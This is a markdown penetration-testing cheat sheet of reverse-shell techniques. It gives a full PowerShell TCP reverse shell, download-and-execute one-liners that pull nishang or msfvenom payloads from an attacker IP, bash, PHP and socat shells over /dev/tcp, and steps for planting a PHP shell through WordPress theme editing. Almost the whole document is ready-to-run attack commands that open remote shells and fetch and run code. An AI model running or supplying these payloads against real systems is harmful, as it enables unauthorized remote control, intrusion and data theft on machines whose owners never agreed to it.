# Reverse Shell

## Listeners
___

### NC
```
nc -lvnp 4444
```
### Metasploit
- Meterpreter listener
```
use exploit/multi/handler
set lhost 0.0.0.0
set lport 4444
set payload windows/(x64)/meterpreter/reverse_tcp
```

## Payload
___

### PHP
- Get reverse shell from Wordpress admin dashboard using themes edition
```
Login as admin, and edit a theme's php file.
Replace content with Pentest Monkey's php-reverse-shell
Browse file : http://hostname/wordpress/wp-content/themes/themename/file.php
```

### Windows

- Powershell
```powershell
powershell -c "$client = New-Object System.Net.Sockets.TCPClient('<ip>',<port>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

- Reverse shell with nishang Invoke-PowershellTcp
```powershell
powershell iex (New-Object Net.WebClient).DownloadString('http://your-ip:your-port/Invoke-PowerShellTcp.ps1')
Invoke-PowerShellTcp -Reverse -IPAddress 10.6.77.211 -Port 4444
```

- Upgrade shell to meterpreter session
```sh
# Generate Payload with msfvenom then serve it with SimpleHTTPServer
msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=[IP] LPORT=[PORT] -f exe -o rshell.exe
msfconsole
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST your-ip
set LPORT listening-port
run
python -m SimpleHTTPServer 8000
```

- Download and execute payload on target machine
```powershell
powershell (New-Object System.Net.WebClient).Downloadfile('http://<ip>:8000/shell-name.exe','shell-name.exe')
```

- Reverse/Privilege Escalation with credentials
```sh
python3 /usr/share/doc/python3-impacket/examples/psexec.py domain/user:password@0.0.0.0 cmd.exe
```

### Metasploit

- Get meterpreter session with SSH login
```sh
use auxiliary/scanner/ssh/ssh_login
set rhosts 0.0.0.0
set username user
set password pass
run
sessions -u 1
```

- Exe Payload
```sh
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<local ip address> LPORT=<local listening port> -f exe > shell.exe
```

- PHP Payload
```sh
msfvenom -p php/meterpreter_reverse_tcp LHOST=<local ip address> LPORT=<local listening port> -f raw > shell.php
cat shell.php | pbcopy && echo '<?php ' | tr -d '\n' > shell.php && pbpaste >> shell.php
```
- Basic PHP command line to open a shell
```php
exec("/bin/bash -c 'bash -i >& /dev/tcp/0.0.0.0/4445 0>&1'");
```

- Bash command to open shell
```sh
bash -c 'bash -i >& /dev/tcp/0.0.0.0/4444 0>&1'
```

- Socat Shell
```sh
wget -q 10.6.77.211/socat -O /tmp/socat; chmod +x /tmp/socat; /tmp/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.6.77.211:443
```

## Upgrading shell
___
- Upgrade shell to bash/pty

```sh
SHELL=/bin/bash script -q /dev/null
```
```sh
python3 -c "import pty;pty.spawn('/bin/bash')"
export TERM=xterm
```

## Links
___
### Guides
- https://www.hackingarticles.in/wordpress-reverse-shell/
- https://github.com/pentestmonkey/php-reverse-shell
- http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
- https://netsec.ws/?p=331
- https://gtfobins.github.io/

### Writeups
- 
